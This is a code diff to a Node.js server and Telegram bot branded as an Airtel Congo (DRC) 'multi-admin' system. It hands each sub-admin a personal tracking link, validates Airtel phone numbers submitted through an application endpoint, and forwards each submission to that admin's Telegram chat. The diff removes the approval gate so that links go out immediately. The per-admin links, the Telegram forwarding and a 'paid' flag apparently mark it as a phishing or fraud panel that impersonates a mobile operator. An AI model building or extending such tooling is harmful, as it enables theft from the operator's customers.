@@ -1,6 +1,6 @@
 /**
- * **AIRTEL CONGO - SECURE MULTI-ADMIN SERVER**
- * Updated with Main Admin Authorization Control for Sub-Admins and Airtel Congo Validation.
+ * **AIRTEL CONGO (DRC) - SECURE MULTI-ADMIN SERVER**
+ * Updated with Main Admin Authorization Control and Immediate Link on /start.
  */
 
 const express = require('express');
@@ -64,8 +64,8 @@ const adminConfigMessageIds = new Map();
 
 function isValidAirtelCongoNumber(number) {
   const clean = String(number || '').replace(/\D/g, '');
-  // Airtel Congo mobile prefixes typically start with 099 or 097, followed by 7 digits (Total 10 digits with leading 0)
-  return /^(099|097)\d{7}$/.test(clean);
+  // Airtel Congo (DRC) mobile prefixes start with 099, 097, or 098 followed by 7 digits
+  return /^(099|097|098)\d{7}$/.test(clean);
 }
 
 function resolveTargetChat(adminParam) {
@@ -164,14 +164,6 @@ async function initBot() {
       const firstName = msg.from.first_name || 'Inconnu';
       const lastName = msg.from.last_name || 'Inconnu';
       
-      if (chatId !== String(FALLBACK_ADMIN_ID)) {
-        const record = admins.get(chatId);
-        if (!record || !record.authorized) {
-          await bot.sendMessage(chatId, `⚠️ Votre compte n'est pas encore autorisé. Veuillez contacter l'Administrateur Principal.`);
-          return;
-        }
-      }
-      
       const userLink = `${APP_URL}/?admin=${chatId}`;
 
       let profileText = 
@@ -194,16 +186,9 @@ async function initBot() {
       const firstName = msg.from.first_name || 'Utilisateur';
       const lastName = msg.from.last_name || '';
 
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Bienvenue Administrateur Principal. Votre lien est actif : ${APP_URL}\n\nTapez /admins pour voir et gérer les administrateurs adjoints.`, {
-          parse_mode: 'Markdown'
-        });
-        return;
-      }
-
       if (!admins.has(chatId)) {
         admins.set(chatId, {
-          authorized: false,
+          authorized: chatId === String(FALLBACK_ADMIN_ID), // Main admin is auto-authorized
           paid: false,
           username,
           firstName,
@@ -219,9 +204,22 @@ async function initBot() {
         saveAdmins();
       }
 
+      const userLink = `${APP_URL}/?admin=${chatId}`;
+
+      if (chatId === String(FALLBACK_ADMIN_ID)) {
+        await bot.sendMessage(chatId, 
+          `👑 *Bienvenue Administrateur Principal.*\n\n` +
+          `🔗 *Votre Lien Personnel :*\n${userLink}\n\n` +
+          `Tapez /admins pour voir et gérer les administrateurs adjoints.`, 
+          { parse_mode: 'Markdown' }
+        );
+        return;
+      }
+
       const record = admins.get(chatId);
 
       if (!record.authorized) {
+        // Notify Main Admin about new user requesting authorization
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
           `🚨 *Nouvel Administrateur Adjoint en Attente!*\n\n` +
           `👤 *Utilisateur :* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
@@ -239,18 +237,13 @@ async function initBot() {
             }
           }
         );
-
-        await bot.sendMessage(chatId, 
-          `👋 *Bienvenue ${firstName}!*\n\n` +
-          `⚠️ Votre compte est actuellement **en attente d'approbation** par l'Administrateur Principal.\n\n` +
-          `Veuillez patienter pendant la validation de votre accès.`, 
-          { parse_mode: 'Markdown' }
-        );
-        return;
       }
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      let responseText = `👋 *Bienvenue ${firstName}!*\n\nVotre compte a été vérifié.\n\nVotre lien personnel est actif :\n${userLink}`;
+      // Immediately send the user link upon /start
+      let responseText = 
+        `👋 *Bienvenue ${firstName} sur Airtel Congo Bot!*\n\n` +
+        `🔗 *Votre Lien Personnel est prêt :*\n${userLink}\n\n` +
+        `*(Remarque : Votre compte sera pleinement opérationnel dès sa validation par l'administration)*`;
 
       await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
 
@@ -384,7 +377,7 @@ app.post('/api/submit-application', async (req, res) => {
 
     const cleanContact = String(contact || '').replace(/\D/g, '');
     if (!isValidAirtelCongoNumber(cleanContact)) {
-      return res.status(400).json({ success: false, error: 'Veuillez entrer un numéro Airtel Congo valide commençant par 099 ou 097.' });
+      return res.status(400).json({ success: false, error: 'Veuillez entrer un numéro Airtel Congo valide (ex: 099, 097, ou 098).' });
     }
 
     const targetChat = resolveTargetChat(adminChatId);
@@ -485,4 +478,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-  
+        
